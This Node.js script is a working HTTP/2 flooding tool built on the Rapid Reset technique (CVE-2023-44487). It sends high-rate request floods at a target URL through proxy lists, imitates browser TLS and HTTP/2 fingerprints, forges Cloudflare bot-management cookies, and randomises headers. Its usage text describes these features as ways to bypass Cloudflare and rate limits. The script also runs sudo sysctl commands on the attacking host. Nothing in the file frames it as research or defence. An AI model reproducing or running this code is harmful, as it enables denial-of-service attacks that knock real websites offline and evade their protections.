// RST STREAM (CVE-2023-44487)

const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const geoip = require('geoip-country');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');
const { exec } = require('child_process');

const ignoreNames = [
    'RequestError',
    'StatusCodeError',
    'CaptchaError',
    'CloudflareError',
    'ParseError',
    'ParserError',
    // 'TypeError'
],
ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ECONNRESET',
    'ERR_ASSERTION',
    'ECONNREFUSED',
    'EPIPE',
    'NGHTTP2_REFUSED_STREAM',
    'EHOSTUNREACH',
    'ERR_HTTP2_STREAM_ERROR',
    'ETIMEDOUT',
    'ESOCKETTIMEDOUT',
    'EPROTO',
    'EADDRNOTAVAIL',
    'ERR_HTTP2_STREAM_ERROR',
];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        console.warn(e);
}).setMaxListeners(0);

const PREFACE_HTTP2 = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function TCP_CHANGES_SERVER() {

    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (error, stdout, stderr) => {    });
    
}

function getTlsSettings()  {

    return {
        brave: {
            ciphers: [
                "ECDHE-ECDSA-AES128-GCM-SHA256", 
                "ECDHE-RSA-AES128-GCM-SHA256"
            ],
            sigalgs: [
                "ecdsa_secp256r1_sha256", 
                "rsa_pss_rsae_sha256"
            ]
        },
        chrome: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "TLS_AES_256_GCM_SHA384"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp384r1_sha384"
            ]
        },
        edge: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "TLS_AES_256_GCM_SHA384"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp384r1_sha384"
            ]
        },
        firefox: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "TLS_CHACHA20_POLY1305_SHA256"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp256r1_sha256"
            ]
        },
        mobile: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "TLS_CHACHA20_POLY1305_SHA256"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp256r1_sha256"
            ]
        },
        opera: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "TLS_AES_256_GCM_SHA384"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp384r1_sha384"
            ]
        },
        operagx: {
            ciphers: [
                "TLS_AES_128_GCM_SHA256", 
                "ECDHE-RSA-AES256-GCM-SHA384"
            ],
            sigalgs: [
                "rsa_pss_rsae_sha256", 
                "ecdsa_secp256r1_sha256"
            ]
        },
        safari: {
            ciphers: [
                "ECDHE-ECDSA-AES128-GCM-SHA256", 
                "TLS_AES_128_GCM_SHA256"
            ],
            sigalgs: [
                "ecdsa_secp256r1_sha256", 
                "rsa_pss_rsae_sha256"
            ]
        }
    }

}

function getHttp2Settings() {
    return {
        brave : [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        edge: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ], 
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", 1],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    }
}

function customSettings(settings) {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };

    return settings.map(([key, value]) => [settingsMap[key], value]);
}

function getBrowserSettings() {

    const browsers = ['brave', 'chrome', 'edge', 'opera', 'operagx', 'mobile', 'firefox', 'safari'];

    let brwsind = 0;
    brwsind = getRandomInt(0,7);

    const browser = browsers[brwsind];
    const settingsTLS = getTlsSettings();
    const settingsHTTP2 = getHttp2Settings();

    const tlsSetting = settingsTLS[browser];
    const http2Setting = settingsHTTP2[browser];

    const http2Config = customSettings(http2Setting);
    const used_browser = browser;

    return {
        browser: used_browser,
        http2Config: http2Config,
        tlsConfig: tlsSetting
    }


}

const secureOptions = [
    crypto.constants.SSL_OP_NO_RENEGOTIATION,
    crypto.constants.SSL_OP_NO_TICKET,
    crypto.constants.SSL_OP_NO_SSLv2,
    crypto.constants.SSL_OP_NO_SSLv3,
    crypto.constants.SSL_OP_NO_COMPRESSION,
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    crypto.constants.SSL_OP_TLSEXT_PADDING,
    crypto.constants.SSL_OP_ALL
];

let timer = 0;
let custom_header = 262144;
let custom_window = 6291456;
let custom_table = 65536;
let custom_update = 15663105;

function incrementCustomValues() {
    custom_header++;
    custom_window++;
    custom_table++;
    custom_update++;
}

function resetCustomValues() {
    custom_table = 65536;
    custom_window = 6291456;
    custom_header = 262144;
    custom_update = 15663105;
    timer = 0;
}

function generateHexString(length) {
    const hexChars = '0123456789abcdef';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * hexChars.length);
        result += hexChars[randomIndex];
    }
    return result;
}

const args = getArgs(); 

const target = args['target'];
const time = ~~args['time'];
const request = ~~args['rps'] || 80;
const threads = ~~args['threads'] || 1;
const proxylist = args['proxys'];
const tlsversion = args['tls'] || '1.3';
const randomrate = args['randomrate'];
const country = args['country'] || "ALL";
const turbo = args['turbo'];
const bfm = args['bfm'];
const delay = args['delay'] || 1;
const debug = args['debug'];
const reqmethod = 'GET';
const forceHttp = 2;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

if(!target || !time || !proxylist){

    console.log(`
    Method based on RST STREAM (CVE-2023-44487) v2.0
    Syntax: 
        node ${process.argv[1]} --target=[target] --time=[time] --proxys=[proxylist] 

    Available Options:
        --rps 1 -> 110 - set custom RPS ex: --rps=70
        --threads Number - set desired threads ex: --threads=5
        --tls 1.1/1.2/1.3 - set custom tls version ex: --tls=1.3
        --randomrate true/null - set random rate for better rate bypass ex: --randomrate=true
        --country COUNTRYCODE - set country proxys ex: --country=TH
        --turbo true/null - send a lot of request, bypass cf ex: --turbo=true
        --bfm true/null - activate only if target have bfm active ex: --bfm=true
        --delay 1 -> 1000 - set custom delay between request best is 1 -> 100ms
    `);

    process.exit(-1);

}       

tls.DEFAULT_MIN_VERSION = 'TLSv' + tlsversion
tls.DEFAULT_MAX_VERSION = 'TLSv' + tlsversion

let header_cookie = '';

const url = new URL(target);
var proxysArray;

if(isNaN(time) || time <= 0){
    console.log('Error time.');
    process.exit(-1);
}

if(isNaN(threads) || threads <= 0){
    console.log('Error threads.');
    process.exit(-1);
}

if (isNaN(request) || request <= 0){
    console.log('Error rps.');
    process.exit(-1);
}

if(bfm){
    header_cookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}; _1__bProxy_v=${generateHexString(64)}`;
}

if(country === 'ALL'){
    proxysArray = fs.readFileSync(proxylist, "utf-8").toString().split(/\r?\n/);
}else{
    proxysArray = [];
    const list = fs.readFileSync(proxylist, "utf-8").toString().split(/\r?\n/);
    list.forEach(proxy =>{
        const res = geo(proxy);
        if(res === country){
            proxysArray.push(proxy)
        }
    })    
}

setInterval(() => {
    timer++;
}, 1000);

// Interval principal
setInterval(() => {
    if (timer <= 10) {
        incrementCustomValues();
    } else {
        resetCustomValues();
    }
}, 10000);

if(cluster.isMaster){

    console.log('RST STREAM (CVE-2023-44487) Started.');
    if(bfm) console.log(`Adapting method for Bot Fight Mod...`);
    if(turbo) console.log(`Setting up Turbo Mod...`);
    if(country) console.log(`the proxies have been sorted..`)
    console.log('Setting up HTTP2 bypass...');
    console.log(`Proxys loaded: ${proxysArray.length}`);


    setInterval(() => {
        TCP_CHANGES_SERVER();
    }, Math.floor(Math.random() * 1000) + 500)    

    for(var z=0;z<threads;z++){
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(-1)
    }, time * 1000);

}else{
    
    let zeub = setInterval(() => {
        flood()
    }, delay);

}

function geo(ip) {

    var ipproxy = ip.split(':')[0]
    var geo = geoip.lookup(ipproxy)
    var result = geo ? geo.country : "unknown";
    return result;

}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function randomAlphabet(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            var _3 = _1.split('=');
            const len = _3.length
            const _4 = _3[0].slice(2, _3[0].length);
            var _5 = _3.length > 1 ? _3[1] : true;
            if(len>2){
                _5 = _3.slice(1).join('=')
            }
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}

function buildHeader() {

    let headers; 

    const browserVersion = getRandomInt(120, 123);
    const browserArray = ['Google Chrome', 'Brave'];
    const randomBrowser = browserArray[Math.floor(Math.random() * browserArray.length)];
    let brandValue;

    if(browserVersion === 120){
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${randomBrowser}";v="${browserVersion}"`;
    }else if(browserVersion === 121){
        brandValue = `"Not A(Brand";v="99", "${randomBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }else if(browserVersion === 122){
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${randomBrowser}";v="${browserVersion}"`;
    }else if(browserVersion === 123){
        brandValue = `"${randomBrowser}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = randomBrowser === 'Brave';

    const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = 'https://' + randomAlphabet(6, 9) + ".net";

    headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
    `Accept: ${acceptHeaderValue}\r\n` +
    'Accept-Encoding: gzip, deflate, br\r\n' +
    'Accept-Language: en-US,en;q=0.7\r\n' +
    'Connection: Keep-Alive\r\n' +
    `Host: ${url.hostname}\r\n` +
    'Sec-Fetch-Dest: document\r\n' +
    'Sec-Fetch-Mode: navigate\r\n' +
    'Sec-Fetch-Site: none\r\n' +
    'Sec-Fetch-User: ?1\r\n' +
    'Upgrade-Insecure-Requests: 1\r\n' +
    `User-Agent: ${userAgent}\r\n` +
    `sec-ch-ua: ${secChUa}\r\n` +
    'sec-ch-ua-mobile: ?0\r\n' +
    `referer: ${currentRefererValue}` +
    'sec-ch-ua-platform: "Windows"\r\n';

    if(bfm){
        headers += `cookie: ${header_cookie}\r\n\r\n`
    }else{
        headers += '\r\n'
    }

    const buffedHeader = Buffer.from(`${headers}`, 'binary');    

    return buffedHeader;

}

function flood(){

    const http1conn = buildHeader();

    const [proxyHost, proxyPort] = proxysArray[~~(Math.random() * proxysArray.length)].split(':');

    if(!proxyPort || isNaN(proxyPort)){
        flood();
        return;
    }

    let tlsSocket;

    for (let i = secureOptions.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [secureOptions[i], secureOptions[j]] = [secureOptions[j], secureOptions[i]];
    }
    
    const selectedSecureOptions = secureOptions.slice(0, Math.floor(Math.random() * secureOptions.length) + 1).reduce((acc, opt) => acc | opt, 0);

    const settings = getBrowserSettings();

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {

            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: settings['tlsConfig']['ciphers'].join(':'),
                sigalgs: settings['tlsConfig']['sigalgs'].join(':'),
                secureOptions: selectedSecureOptions,
                secure: true,
                minVersion: `TLSv${tlsversion}`,
                maxVersion: `TLSv${tlsversion}`,
                rejectUnauthorized: false
            }, () =>{

                if(!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1'){

                    if(forceHttp == 2){
                        tlsSocket.end(() => tlsSocket.destroy())
                        return;
                    }

                    function zWrite(){
                        tlsSocket.write(http1conn, (err) => {
                            if(!err) {
                                setTimeout(() => {
                                    zWrite()
                                }, turbo ? 1000 : 1000 / rps)
                            }else{
                                tlsSocket.end(() => tlsSocket.destroy())
                                return;
                            }
                        })
                    }

                    zWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return;
                    })

                    return;

                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096)

                let updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                const frames = [
                    Buffer.from(PREFACE_HTTP2, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...settings['http2Config']
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {

                    data = Buffer.concat([data, eventData]);

                    while(data.length >= 9){
                        const frame = decodeFrame(data);
                        if(frame != null){
                            data = data.subarray(frame.length + 9);
                            if(frame.type == 4 && frame.flags == 0){
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }else if(frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (status == 403) tlsSocket.end(() => tlsSocket.destroy());

                                if (args['debug']) console.log('Status Code:', status )
                            }else if(frame.type == 7 || frame.type == 5){

                                if(frame.type == 7){
                                    if (args['debug']) console.log('GOAWAY')
                                }

                                tlsSocket.write(encodeRstStream(0, 3, 0)); // beta
                                tlsSocket.end(() => tlsSocket.destroy()) // still beta

                            }

                        }else {
                            break;
                        }
                    }

                })

                tlsSocket.write(Buffer.concat(frames))

                function wWrite(){

                    if(tlsSocket.destroyed){
                        return;
                    }

                    const requests = [];

                    let ratelimit;

                    if(randomrate){
                        customRate = getRandomInt(1, 110);
                    }else{
                        customRate = request;
                    }

                    for(let i = 0; i < (turbo ? customRate : 1); i++){
                    
                        let combinedHeaders;

                        const browserVersion = getRandomInt(120, 123);
                        const browserArray = ['Google Chrome', 'Brave'];
                        const randomBrowser = browserArray[Math.floor(Math.random() * browserArray.length)];
                        let brandValue;
                    
                        if(browserVersion === 120){
                            brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${randomBrowser}";v="${browserVersion}"`;
                        }else if(browserVersion === 121){
                            brandValue = `"Not A(Brand";v="99", "${randomBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
                        }else if(browserVersion === 122){
                            brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${randomBrowser}";v="${browserVersion}"`;
                        }else if(browserVersion === 123){
                            brandValue = `"${randomBrowser}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
                        }
                    
                        const isBrave = randomBrowser === 'Brave';
                    
                        const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                        const secGpcValue = isBrave ? "1" : undefined;

                        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        const secChUa = `${brandValue}`;
                        const currentRefererValue = 'https://' + randomAlphabet(6, 9) + ".net";
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": url.pathname,
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-US,en;q=0.9",
                            ...(header_cookie && { "cookie": header_cookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`custom-header-${getRandomChar()}`]: getRandomChar() }),
                            ...(Math.random() < 0.3 && { [`random-header-${getRandomChar()}`]: getRandomChar() }),
                            ...(Math.random() < 0.3 && { [`extra-header-${getRandomChar()}`]: getRandomChar() }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        combinedHeaders = headers.concat(headers2);    

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
    
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2

                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                wWrite()
                            }, turbo ? 1000 : 1000 / customRate)
                        }
                    })

                }

                wWrite()

            }).on('error', () => {
                tlsSocket.destroy()
            })

        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); flood() })
        }
    })

}